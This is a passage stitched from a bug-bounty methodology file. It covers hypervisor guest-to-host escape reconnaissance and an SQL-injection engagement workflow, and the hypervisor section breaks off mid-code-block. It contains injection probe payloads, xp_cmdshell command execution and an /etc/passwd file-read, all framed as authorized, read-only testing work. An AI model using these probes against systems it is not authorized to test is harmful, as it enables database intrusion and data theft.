device emulation — unchecked descriptor lengths, config-space OOB, integer
overflows in packet handling — turn a guest-side ioctl into host-process
code execution. The violated assumption: "the guest↔host device interface
is data-only" when the host parser is C/C++ code handling guest-controlled
structures.

**Preconditions:**
- Code execution inside a guest VM (malicious tenant, compromised guest,
  CTF/lab — most real bug bounty paths require you to *be* the guest, which
  means the surface is the *product's* hypervisor layer)
- An exposed emulated device with known-vulnerable version (guest additions/
  tools, VBox guest drivers, QEMU device models)
- Hypervisor/device version known (guest-side fingerprint or infra disclosure)

**Detect:**
1. Guest-side benign recon: `dmidecode -s system-manufacturer` /
   `system-product-name` (`VMware, Inc.`, `innotek GmbH`/Oracle, `QEMU`),
   `lspci | grep -i -E 'virtio|vmware|vbox'`, `ls /sys/bus/virtio/devices`,
   `VBoxControl --version 2>/dev/null`, `vmware-toolbox-cmd -v 2>/dev/null`
   — presence of guest additions/tools is itself the exposed surface.
2. Surface inventory: which channels exist? Shared folders/clipboard mounted?
   3D/virgl? USB passthrough emulation? Fewer devices = smaller attack
   surface; report what is *on*.
3. Version match: guest-reported additions/driver version, or host-side
   QEMU/VBox/VMware version from the program's disclosed infra (chain
   `info-disclosure-testing` for version banners) → check vendor advisories
   and distro backports.
4. Lab-only: public guest→host PoCs run against **your** version-matched
   hypervisor VMs. Fuzzing a production hypervisor is a DoS risk and off-
   limits (guardrail).

**Proof of concept:**
```

## [Bugbountyskills.md] lab only: <PUBLIC_POC_FOR_<HYPERVISOR>_<VER>> → benign proof: host marker

## [Bugbountyskills.md] 2. Engagement workflow

1. **Recon & endpoint inventory.** Map every input-bearing surface before sending
   anything: query strings, POST bodies (form, JSON, XML, GraphQL `variables`),
   path segments, headers (`User-Agent`, `Referer`, `Cookie`, `X-Forwarded-For`),
   file-name parameters, sort/filter fields in AJAX calls, and anything a webhook or
   export feature passes to a reporting database. Use proxy logs (Burp/ZAP), the
   browser network tab, and `ffuf` discovery. *Why:* injection hunting fails most
   often because the injectable parameter was never found — the sink is usually in a
   second-order or admin-facing feature nobody looked at.

2. **Parameter & sink mapping.** For each candidate input, classify what it likely
   becomes: a string literal (`'..'` context — union/error/boolean candidates), an
   identifier (table/column names — structural variants), an integer in a `WHERE` or
   `LIMIT` (boolean/time/truncation candidates), a sort key (variant 9), a document
   filter (NoSQLi, variant 13), or something written to the DB and re-queried later
   (second-order, variants 7 and 15). *Why:* the sink type determines which variant
   can even work; feeding union payloads at an integer `LIMIT` slot wastes your
   time, feeding comments at a JSON body does too.

3. **Variant selection.** Use the routing table in §3 to pick 1-2 variants from the
   observed signal (error message, WAF block page, blind behavior, slow responses).
   Read the matching section in `references/variants-1.md` or `references/variants-2.md`
   before improvising — each has preconditions and false-positive traps.

4. **Safe probe.** Send a benign differential probe, not an exploit: a single quote
   `'` vs `' '` (space-padded), `AND 1=1` vs `AND 1=2`, a `+`-appended comment, or
   `' OR '1'='1'-- ` with `-- ` (note trailing space). Compare responses byte-for-byte
   and by timing. *Why:* you need a signal before you escalate; a probe that only
   "looks weird" is a lead, not a finding.

5. **Confirmation test.** Prove the signal with a second, *independent* mechanism.
   Error message observed → confirm with boolean flip. Blind boolean flips → confirm
   with a measured time delta or OOB callback. A single channel can lie (cache, WAF
   template, rate limiter, locale-specific error page). *Why:* independent
   corroboration is what separates confirmed findings from noise in triage.

6. **Impact proof (read-only).** Extract only what proves impact: your own account's
   row, the fact that `version()` returns a string, one schema table name via a
   boolean oracle, or file read of a file you may access (`/etc/passwd` only if the
   program explicitly allows it — otherwise read a file you own). For DB-specific
   command execution, demonstrate the *capability* (e.g. `xp_cmdshell` returns
   `whoami` of a low-priv service account) without touching other users' data.

7. **False-positive filter.** Rule out: cached responses, WAF/CDN error templates,
   generic 500s from malformed input unrelated to SQL, timing caused by network
   jitter or the target's own load, boolean differences caused by random tokens or
   nonces, and framework behavior that echoes input verbatim. Re-run each probe
   3-5 times; a real oracle is deterministic.

8. **Report.** Write it up with the template in §5 — one request/response pair that
   reproduces, redacted evidence, and a remediation that names the actual root cause
   (parameterized query at line X, missing cast, template-built ORDER BY).

